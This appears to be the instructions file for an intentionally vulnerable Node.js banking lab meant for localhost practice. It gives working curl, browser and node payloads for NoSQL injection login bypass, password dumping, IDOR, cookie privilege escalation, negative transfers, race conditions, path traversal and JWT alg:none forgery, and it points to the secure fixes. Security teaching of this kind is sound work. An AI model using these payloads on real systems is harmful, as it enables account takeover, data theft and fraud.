# Node Bank of VULN — Instructions

What to do, step by step. **Lab only — run on `localhost`.**

---

## 0. Start the app

```bash
cd node_vunreability
npm install                 # first time only

# Option A — real MongoDB via Docker (recommended):
npm run mongo:up            # starts mongo:7 on :27017
npm start

# Option B — no Docker: just start it; the app auto-falls back to an
# in-memory MongoDB (mongodb-memory-server). This is what you're using if
# you saw: "✅ Using in-memory MongoDB".
npm start
```

You should see:
```
🏦 Node Bank of VULN running:  http://localhost:3000/
   Seed logins: admin@bank.local/Admin@123 · alice@bank.local/alice123 · bob@bank.local/bob123
```

> The in-memory database resets every time you stop the app, so the 4 seed
> accounts come back fresh on each start. Experiment freely.

### Seed accounts

| id | email | password | role | balance | account # |
|----|-------|----------|------|---------|-----------|
| 1 | admin@bank.local | Admin@123 | admin | $999,999.99 | 1000000001 |
| 2 | alice@bank.local | alice123 | user | $1,000.00 | 1000000002 |
| 3 | bob@bank.local | bob123 | user | $500.00 | 1000000003 |
| 4 | mallory@bank.local | mallory123 | user | $25.00 | 1000000004 |

---

## 1. Explore in the browser

Open **http://localhost:3000/** and log in as `alice@bank.local` / `alice123`.
Click through the nav: Dashboard · Transfer · Claim Bonus · Profile · Browse
Accounts · Admin · File viewer. Each page has a yellow hint box telling you
what to attack.

---

## 2. Verify everything at once (one command)

In a second terminal, with the server running:

```bash
cd node_vunreability
BASE=http://localhost:3000 bash smoke-test.sh
```

Expected: **`RESULT: 10 passed, 0 failed`** — it proves all 10 exploits fire
end-to-end (NoSQL injection, IDOR, privilege escalation, path traversal,
dev-file leak, JWT forgery, negative transfer, race condition).

---

## 3. Try the attacks by hand

Set `BASE=http://localhost:3000` first for the curl examples.

### NoSQL auth bypass (log in as admin without the password)
```bash
curl -s -c jar.txt -H 'Content-Type: application/json' \
  -d '{"email":"admin@bank.local","password":{"$ne":"x"}}' \
  $BASE/login -i | grep -i location        # → Location: /
```
Form-field version: `email=admin@bank.local&password[$ne]=x`

### Dump every account + plaintext password ($where injection)
Open in the browser:
```
http://localhost:3000/search?filter={"$where":"return true"}
```

### IDOR — read anyone's row by walking the id
```
http://localhost:3000/view-account?id=1     (admin's plaintext password)
http://localhost:3000/view-account?id=2     (alice) … etc.
```

### Privilege escalation — become admin via a cookie
DevTools → Application → Cookies → set `role=admin`, then open:
```
http://localhost:3000/admin?admin=1
```

### Negative-amount transfer — mint money (as bob)
```bash
curl -s -b jar.txt -d 'from_account=1000000003&to_account=1000000002&amount=-1000&transfer=1' $BASE/transfer
```

### Race condition — lose deposits with concurrent bonus claims
```bash
# log in, then fire 10 at once — you gain far less than $100
for i in $(seq 1 10); do curl -s -b jar.txt -X POST $BASE/bonus -o /dev/null & done; wait
```

### Path traversal + dev-file leak
```
http://localhost:3000/file?file=.env        (traversal reads .env)
http://localhost:3000/.env                   (served straight from web root)
```

### JWT alg:none forgery
```bash
node -e 'const b=o=>Buffer.from(JSON.stringify(o)).toString("base64url");
  process.stdout.write(b({alg:"none",typ:"JWT"})+"."+b({sub:"admin",role:"admin"})+".")' > tok
curl -s -H "Authorization: Bearer $(cat tok)" $BASE/api    # → "role":"admin"
```

> Full playbook (§1–§14) with every payload: see **README.md**.

---

## 4. Run the standalone concept demos (no server needed)

Each explains one bug, shows vulnerable vs secure code, and runs live:

```bash
node demos/file-exposure.js          # path traversal, LFI→RCE, source disclosure
node demos/broken-authorization.js   # IDOR + privilege escalation
node demos/logic-flaw.js             # negative amount, client-set price, coupon reuse
node demos/race-condition.js         # TOCTOU lost updates
node demos/rate-limit.js             # X-Forwarded-For key bypass
node demos/dev-file-leak.js          # secrets in the web root
```

See `demos/README.md` for the PHP→Node mapping table.

---

## 5. Stop the app

Press **Ctrl+C** in the server terminal. If you used Docker:

```bash
npm run mongo:down          # stop and remove the MongoDB container
```

The in-memory database is discarded automatically on exit.

---

## 6. Learn the fixes

Every vulnerable route in `server.js` is commented with its bug. The secure
patterns are in `README.md` (Defence checklist) and shown side-by-side in each
`demos/*.js` file. Study note for Google Drive / revision: ask for `STUDY-NOTES`.
